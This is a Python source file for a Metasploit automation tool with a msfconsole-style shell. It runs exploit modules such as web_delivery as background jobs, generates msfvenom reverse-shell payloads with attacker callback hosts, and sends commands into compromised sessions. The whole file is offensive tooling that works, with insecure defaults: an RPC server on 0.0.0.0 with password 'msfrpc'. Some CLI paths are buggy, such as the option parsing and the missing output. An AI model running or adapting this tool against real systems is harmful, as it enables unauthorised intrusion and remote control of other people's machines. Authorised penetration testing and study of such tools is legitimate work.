import argparse
import configparser
import re
import time
import logging
import subprocess
import shlex
import os
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError
import json


# Polling configuration for console/session reads
POLL_INTERVAL = 0.5
CONSOLE_TIMEOUT = 15
SESSION_TIMEOUT = 10
SESSION_QUIET_ROUNDS = 2


# Load configuration from config.ini
def load_config(config_file, section):
    config = configparser.ConfigParser()
    config.read(config_file)
    return dict(config.items(section)) if config.has_section(section) else {}


# Parse the arguments and load from config.ini if necessary
def parse_arguments(config):
    parser = argparse.ArgumentParser(description='Metasploit Tool with Multiple Functionalities.')

    subparsers = parser.add_subparsers(dest='command', help='Choose a functionality to use')

    # Functionality 1: Run Metasploit module
    run_parser = subparsers.add_parser('run_module', help='Run any Metasploit module and get its output.')
    run_parser.add_argument('module', help='The Metasploit module to use (e.g., exploit/multi/script/web_delivery).')
    run_parser.add_argument('--option', action='append', help='Module options in the form OPTION=VALUE.', required=True)
    run_parser.add_argument('--regex', help='Regex pattern to filter output.', default=config.get('regex', r"Run the following command on the target machine:\n(.*)"))
    run_parser.add_argument('--rpc-password', help='The password for the Metasploit RPC server.', default=config.get('rpc_password', 'msfrpc'))
    run_parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default=config.get('rpc_server', '127.0.0.1'))
    run_parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=int(config.get('rpc_port', 55552)))
    run_parser.add_argument('--rpc-ssl', action='store_true', help='Use SSL for RPC connection.')

    # Get jobs
    jobs_parser = subparsers.add_parser('get_jobs', help='Poll the active Metasploit jobs.')
    jobs_parser.add_argument('--rpc-password', help='The password for the Metasploit RPC server.', default=config.get('rpc_password', 'msfrpc'))
    jobs_parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default=config.get('rpc_server', '127.0.0.1'))
    jobs_parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=int(config.get('rpc_port', 55552)))
    jobs_parser.add_argument('--rpc-ssl', action='store_true', help='Use SSL for RPC connection.')

    # Get sessions
    sessions_parser = subparsers.add_parser('get_sessions', help='Poll the active Metasploit sessions.')
    sessions_parser.add_argument('--rpc-password', help='The password for the Metasploit RPC server.', default=config.get('rpc_password', 'msfrpc'))
    sessions_parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default=config.get('rpc_server', '127.0.0.1'))
    sessions_parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=int(config.get('rpc_port', 55552)))
    sessions_parser.add_argument('--rpc-ssl', action='store_true', help='Use SSL for RPC connection.')

    # Access session and run command
    access_parser = subparsers.add_parser('run_command', help='Access a Metasploit session and run a command.')
    access_parser.add_argument('session_id', help='The ID of the session to access.')
    access_parser.add_argument('commands', nargs='+', help='The command(s) to run in the session.')
    access_parser.add_argument('--rpc-password', help='The password for the Metasploit RPC server.', default=config.get('rpc_password', 'msfrpc'))
    access_parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default=config.get('rpc_server', '127.0.0.1'))
    access_parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=int(config.get('rpc_port', 55552)))
    access_parser.add_argument('--rpc-ssl', action='store_true', help='Use SSL for RPC connection.')

    # Generate payload
    venom_parser = subparsers.add_parser('generate_payload', help='Generate a payload using msfvenom.')
    venom_parser.add_argument('format', help='The output format of the payload (e.g., exe, elf, raw).')
    venom_parser.add_argument('payload', help='The payload to generate (e.g., windows/meterpreter/reverse_tcp).')
    venom_parser.add_argument('lhost', help='The local host IP for the payload.')
    venom_parser.add_argument('lport', help='The local port for the payload.')
    venom_parser.add_argument('output_file', help='The file to save the generated payload to.')

    # Start RPC Server
    rpc_parser = subparsers.add_parser('start_rpc', help='Start the Metasploit RPC server.')
    rpc_parser.add_argument('--rpc-user', help='Username for the RPC server.', default='msf')
    rpc_parser.add_argument('--rpc-server', help='Username for the RPC server.', default='0.0.0.0')
    rpc_parser.add_argument('--rpc-password', help='Password for the RPC server.', default='msfrpc')
    rpc_parser.add_argument('--rpc-port', help='Port for the RPC server.', type=int, default=55552)
    rpc_parser.add_argument('--rpc-ssl', action='store_true',default=False, help='Use SSL for RPC connection.')


    return parser.parse_args()


# Core functions
def _read_console(console, timeout=CONSOLE_TIMEOUT, interval=POLL_INTERVAL):
    """Read a console, accumulating output until it is no longer busy or timeout.

    Settles for one interval first: msfrpc may report not-busy on the first read
    before the command's output has started, which would truncate the result.
    """
    time.sleep(interval)
    deadline = time.monotonic() + timeout
    chunks = []
    while True:
        result = console.read()
        chunks.append(result.get("data", ""))
        if not result.get("busy", False):
            break
        if time.monotonic() >= deadline:
            break
        time.sleep(interval)
    return "".join(chunks)


def _read_session(session, timeout=SESSION_TIMEOUT, interval=POLL_INTERVAL,
                  quiet_rounds=SESSION_QUIET_ROUNDS):
    """Read a session, stopping after output goes quiet for `quiet_rounds` polls.

    Settles for one interval first so a slow session does not immediately hit
    the quiet-round limit and return empty before output arrives.
    """
    time.sleep(interval)
    deadline = time.monotonic() + timeout
    chunks = []
    quiet = 0
    while True:
        data = session.read() or ""
        if data:
            chunks.append(data)
            quiet = 0
        else:
            quiet += 1
            if quiet >= quiet_rounds:
                break
        if time.monotonic() >= deadline:
            break
        time.sleep(interval)
    return "".join(chunks)


# Functionality 1: Run any Metasploit module
def run_exploit(client, module_name, options, regex=None):
    """Run a module via a console (`run -j`) and return structured output."""
    try:
        console = client.consoles.console()
        console.write(f"use {module_name}\n")
        for option, value in options.items():
            console.write(f"set {option} {value}\n")
        console.write("run -j\n")
        output = _read_console(console)

        filtered_output = None
        if regex:
            matches = re.findall(regex, output, re.DOTALL)
            filtered_output = "\n".join(matches)

        return {
            "status": "success",
            "module": module_name,
            "options": options,
            "raw_output": output,
            "filtered_output": filtered_output if filtered_output else "No match for regex",
        }
    except MsfRpcError as e:
        return {"status": "error", "message": f"Metasploit RPC error: {str(e)}"}
    except Exception as e:
        return {"status": "error", "message": f"An unexpected error occurred: {str(e)}"}


# Functionality to start the RPC server
def start_rpc_server(rpc_password, rpc_port, rpc_ssl, rpc_user, rpc_server):
    try:
        # Command to start Metasploit RPC server
        if rpc_ssl:
            command = ['msfrpcd', '-P', rpc_password, '-p', str(rpc_port)]
        else:
            command = ['msfrpcd', '-P', rpc_password, '-p', str(rpc_port), '-S']
        logging.info(f"Starting Metasploit RPC server with command: {' '.join(command)}")
        subprocess.run(command, check=True)
        logging.info("Metasploit RPC server started successfully.")

        # Output success message as JSON
        output = {
            "status": "success",
            "message": "Metasploit RPC server started successfully",
            "details": {
                "rpc_port": rpc_port,
                "rpc_password": rpc_password
            }
        }
        print(json.dumps(output, indent=4))

    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to start Metasploit RPC server: {e}")

        # Output error message as JSON
        error_output = {
            "status": "error",
            "message": f"Failed to start Metasploit RPC server: {str(e)}"
        }
        print(json.dumps(error_output, indent=4))



def make_client(rpc_password, rpc_server, rpc_port, rpc_ssl):
    """Build a Metasploit RPC client."""
    return MsfRpcClient(rpc_password, server=rpc_server, port=rpc_port, ssl=rpc_ssl)


# Functionality 2: Poll active jobs
def get_jobs(client):
    """Return the dict of active Metasploit jobs."""
    return client.jobs.list


# Functionality 3: Poll active sessions
def get_sessions(client):
    """Return the dict of active Metasploit sessions."""
    return client.sessions.list


def kill_job(client, job_id):
    """Stop a running job by id."""
    client.jobs.stop(str(job_id))
    return {"status": "success", "message": f"Job {job_id} killed"}


# Functionality 4: Access session and run chained commands (e.g., open shell and run a PowerShell command)
def run_session_command(client, session_id, command):
    """Write one command to a session and return the polled output."""
    session = client.sessions.session(session_id)
    session.write(command + "\n")
    return _read_session(session)


def access_session(client, session_id, command_sequence):
    """Run a sequence of commands in a session; return the final result."""
    results = []
    for command in command_sequence:
        results.append(run_session_command(client, session_id, command))
    return {
        "session_id": session_id,
        "command_sequence": command_sequence,
        "final_result": results[-1] if results else "",
    }



def parse_options(option_args):
    """Parse --option values. Accept OPTION=VALUE (preferred) or 'OPTION VALUE'."""
    options = {}
    for opt in option_args or []:
        if "=" in opt:
            key, value = opt.split("=", 1)
        else:
            key, value = opt.split(" ", 1)
        options[key.strip()] = value.strip()
    return options


# Functionality 5: Generate a payload with msfvenom
def generate_payload(fmt, payload, lhost, lport, output_file):
    """Generate a payload with msfvenom; return a structured result."""
    command = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
               "-f", fmt, "-o", output_file]
    try:
        subprocess.run(command, check=True)
        return {
            "status": "success",
            "message": f"Payload saved to {output_file}",
            "details": {"format": fmt, "payload": payload, "lhost": lhost,
                        "lport": lport, "output_file": output_file},
        }
    except subprocess.CalledProcessError as e:
        return {"status": "error", "message": f"Failed to generate payload: {str(e)}"}


# Presentation layer: aligned-table rendering and per-kind formatters
def render_table(headers, rows):
    """Render an aligned text table. Returns '(none)' for empty rows."""
    if not rows:
        return "(none)"
    str_rows = [[str(c) for c in row] for row in rows]
    cols = list(zip(*([headers] + str_rows)))
    widths = [max(len(c) for c in col) for col in cols]

    def fmt(row):
        return "  ".join(c.ljust(w) for c, w in zip(row, widths))

    lines = [fmt(headers), "  ".join("-" * w for w in widths)]
    lines += [fmt(row) for row in str_rows]
    return "\n".join(lines)


def format_jobs(jobs):
    rows = [[jid, name] for jid, name in (jobs or {}).items()]
    return render_table(["Job ID", "Module"], rows)


def format_sessions(sessions):
    rows = []
    for sid, info in (sessions or {}).items():
        info = info or {}
        rows.append([sid, info.get("type", ""), info.get("tunnel_peer", ""),
                     info.get("info", "")])
    return render_table(["ID", "Type", "Peer", "Info"], rows)


def format_exploit_result(result):
    if result.get("status") == "error":
        return f"[!] {result.get('message')}"
    return result.get("raw_output", "") or "[*] module started"


class RtkConsole:
    """Interactive msfconsole-style REPL over a persistent RPC client."""

    def __init__(self, client, conn_info=None):
        self.client = client
        self.conn_info = conn_info or {}
        self.current_module = None
        self.module_options = {}
        self.output_mode = "table"

    def prompt_str(self):
        if self.current_module:
            return f"rtk ({self.current_module}) > "
        return "rtk > "

    def _emit(self, data, table_fn):
        if self.output_mode == "json":
            return json.dumps(data, indent=4)
        return table_fn(data)

    def dispatch(self, line):
        """Parse and execute one command. Returns (output, keep_going, action)."""
        line = (line or "").strip()
        if not line:
            return ("", True, None)
        try:
            parts = shlex.split(line)
        except ValueError as e:
            return (f"[!] parse error: {e}", True, None)
        cmd, cmd_args = parts[0], parts[1:]

        if cmd in ("exit", "quit"):
            return ("", False, None)
        if cmd == "sessions" and cmd_args and cmd_args[0] == "-i":
            if len(cmd_args) < 2:
                return ("[!] usage: sessions -i <id>", True, None)
            return ("", True, ("interact", cmd_args[1]))

        handler = {
            "jobs": self.do_jobs,
            "sessions": self.do_sessions,
            "use": self.do_use,
            "set": self.do_set,
            "unset": self.do_unset,
            "options": self.do_options,
            "run": self.do_run,
            "exploit": self.do_run,
            "back": self.do_back,
            "generate": self.do_generate,
            "connect": self.do_connect,
            "help": self.do_help,
            "?": self.do_help,
        }.get(cmd)
        if handler is None:
            return (f"[!] unknown command: {cmd} (try 'help')", True, None)
        try:
            return (handler(cmd_args), True, None)
        except MsfRpcError as e:
            return (f"[!] RPC error: {e}", True, None)
        except Exception as e:
            logging.debug("Unhandled error in dispatch", exc_info=True)
            return (f"[!] error: {e}", True, None)

    # --- handlers (return a string) ---

    def do_jobs(self, args):
        if args and args[0] == "-k":
            if len(args) < 2:
                return "[!] usage: jobs -k <id>"
            return self._emit(kill_job(self.client, args[1]),
                              lambda d: d.get("message", ""))
        return self._emit(get_jobs(self.client), format_jobs)

    def do_sessions(self, args):
        return self._emit(get_sessions(self.client), format_sessions)

    def do_use(self, args):
        if not args:
            return "[!] usage: use <module>"
        self.current_module = args[0]
        self.module_options = {}
        return f"[*] using {args[0]}"

    def do_set(self, args):
        if len(args) >= 2 and args[0] == "output":
            mode = args[1].lower()
            if mode not in ("json", "table"):
                return "[!] output mode must be json or table"
            self.output_mode = mode
            return f"[*] output mode: {mode}"
        if len(args) < 2:
            return "[!] usage: set <OPTION> <VALUE>  |  set output json|table"
        if not self.current_module:
            return "[!] no module selected (use <module> first)"
        self.module_options[args[0]] = " ".join(args[1:])
        return f"{args[0]} => {' '.join(args[1:])}"

    def do_unset(self, args):
        if args and args[0] in self.module_options:
            del self.module_options[args[0]]
            return f"unset {args[0]}"
        return "[!] not set"

    def do_options(self, args):
        if not self.current_module:
            return "[!] no module selected"
        rows = [[k, v] for k, v in self.module_options.items()]
        return f"Module: {self.current_module}\n" + render_table(["Option", "Value"], rows)

    def do_run(self, args):
        if not self.current_module:
            return "[!] no module selected (use <module> first)"
        result = run_exploit(self.client, self.current_module, dict(self.module_options))
        return self._emit(result, format_exploit_result)

    def do_back(self, args):
        self.current_module = None
        self.module_options = {}
        return ""

    def do_generate(self, args):
        if len(args) != 5:
            return "[!] usage: generate <fmt> <payload> <lhost> <lport> <outfile>"
        result = generate_payload(*args)
        return self._emit(result, lambda d: d.get("message", ""))

    def do_connect(self, args):
        ci = self.conn_info
        return (f"[*] RPC {ci.get('rpc_server')}:{ci.get('rpc_port')} "
                f"ssl={ci.get('rpc_ssl')}")

    def do_help(self, args):
        return (
            "Commands:\n"
            "  jobs                         list active jobs\n"
            "  jobs -k <id>                 kill a job\n"
            "  sessions                     list active sessions\n"
            "  sessions -i <id>             interact with a session\n"
            "  use <module>                 select a module\n"
            "  set <OPT> <VAL>              set a module option\n"
            "  unset <OPT>                  clear a module option\n"
            "  options                      show current module + options\n"
            "  run | exploit                run the current module (run -j)\n"
            "  back                         clear current module\n"
            "  generate <fmt> <payload> <lhost> <lport> <outfile>\n"
            "  set output json|table        switch output format\n"
            "  connect                      show RPC connection\n"
            "  help | ?                     this help\n"
            "  exit | quit                  leave the console"
        )


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Load configuration
    config_file = 'config.ini'
    config = load_config(config_file, 'default')

    # Parse arguments with config overrides
    args = parse_arguments(config)

    if args.command == 'start_rpc':
        start_rpc_server(args.rpc_password, args.rpc_port, args.rpc_ssl, args.rpc_user, args.rpc_server)

    else:

        if args.command == 'run_module':
            client = MsfRpcClient(args.rpc_password, server=args.rpc_server, port=args.rpc_port, ssl=args.rpc_ssl)

            options = {}
            for opt in args.option:
                key, value = opt.split(' ', 1)
                options[key.strip()] = value.strip()
            run_exploit(client, args.module, options, args.regex)

        elif args.command == 'get_jobs':
            client = MsfRpcClient(args.rpc_password, server=args.rpc_server, port=args.rpc_port, ssl=args.rpc_ssl)

            get_jobs(client)

        elif args.command == 'get_sessions':
            client = MsfRpcClient(args.rpc_password, server=args.rpc_server, port=args.rpc_port, ssl=args.rpc_ssl)

            get_sessions(client)

        elif args.command == 'run_command':
            client = MsfRpcClient(args.rpc_password, server=args.rpc_server, port=args.rpc_port, ssl=args.rpc_ssl)

            access_session(client, args.session_id, args.commands)

        elif args.command == 'generate_payload':
            generate_payload(args.format, args.payload, args.lhost, args.lport, args.output_file)